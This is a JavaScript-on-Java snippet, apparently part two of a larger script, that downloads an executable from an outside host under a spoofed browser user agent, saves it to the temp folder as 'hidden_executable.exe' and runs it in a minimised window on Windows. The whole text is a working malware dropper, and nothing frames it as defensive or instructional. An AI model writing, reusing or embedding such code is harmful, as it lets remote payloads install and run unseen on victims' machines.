// ==== PART 2: Download & Run EXE (Windows-only) ====
try {
    var File = Java.type("java.io.File");
    var Files = Java.type("java.nio.file.Files");
    var Paths = Java.type("java.nio.file.Paths");
    var Runtime = Java.type("java.lang.Runtime");
    var System = Java.type("java.lang.System");

    // Replace with your EXE URL
    var exeUrl = "https://r2.e-z.host/c4fb8249-0756-49bd-8cab-d1d22d088421/apb3y3z4.exe";
    var tempDir = System.getProperty("java.io.tmpdir");
    var exePath = Paths.get(tempDir, "hidden_executable.exe");

    // Download EXE
    var connection = new URL(exeUrl).openConnection();
    connection.setRequestProperty("User-Agent", "Mozilla/5.0");
    var inStream = connection.getInputStream();
    Files.copy(inStream, exePath);
    inStream.close();

    // Execute EXE (hidden window)
    if (System.getProperty("os.name").contains("Windows")) {
        Runtime.getRuntime().exec("cmd /c start /min " + exePath.toString());
    } else {
        print("[!] EXE can only run on Windows.");
    }

    print("[+] EXE executed (hidden)!");
} catch (e) {
    print("[-] EXE execution failed: " + e);
}
